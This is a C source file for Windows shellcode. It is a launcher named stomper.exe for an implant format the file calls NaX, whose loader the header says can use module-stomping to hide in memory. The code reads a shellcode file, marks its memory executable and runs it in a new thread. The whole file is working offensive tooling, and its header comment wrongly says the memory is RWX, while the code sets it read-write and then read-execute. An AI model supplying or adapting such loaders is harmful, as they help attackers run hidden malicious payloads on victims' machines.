#include <windows.h>
#include <stdio.h>

/* ========= [ NaX dev launcher ] =========
 *
 * Loads nax.bin into RWX memory and transfers execution to the loader.
 * The loader itself parses NaxHeader v2 and decides whether to module-stomp
 * or VirtualAlloc based on the embedded flags - stomper does NOT need to
 * know which mode is active.
 *
 * Usage:  stomper.exe path\to\nax.x64.bin
 */

int main( int argc, char** argv ) {
    HANDLE hFile   = INVALID_HANDLE_VALUE;
    PVOID  buf     = NULL;
    DWORD  sz      = 0;
    DWORD  rd      = 0;
    DWORD  old     = 0;
    HANDLE hThread = NULL;

    if ( argc < 2 ) {
        puts( "usage: stomper.exe <nax.bin>" );
        return 1;
    }

    hFile = CreateFileA( argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        printf( "[!] CreateFileA failed: %lu\n", GetLastError() );
        return 1;
    }

    sz = GetFileSize( hFile, NULL );
    printf( "[*] loaded \"%s\" (%lu bytes)\n", argv[1], sz );

    buf = VirtualAlloc( NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !buf ) {
        printf( "[!] VirtualAlloc failed: %lu\n", GetLastError() );
        CloseHandle( hFile );
        return 1;
    }

    ReadFile( hFile, buf, sz, &rd, NULL );
    CloseHandle( hFile );

    if ( !VirtualProtect( buf, sz, PAGE_EXECUTE_READ, &old ) ) {
        printf( "[!] VirtualProtect failed: %lu\n", GetLastError() );
        return 1;
    }

    printf( "[*] shellcode @ %p  RX\n", buf );
    printf( "[*] press enter to execute...\n" );
    getchar();

    hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL );
    if ( !hThread ) {
        printf( "[!] CreateThread failed: %lu\n", GetLastError() );
        return 1;
    }

    WaitForSingleObject( (HANDLE)-1, INFINITE );
    CloseHandle( hThread );

    return 0;
}
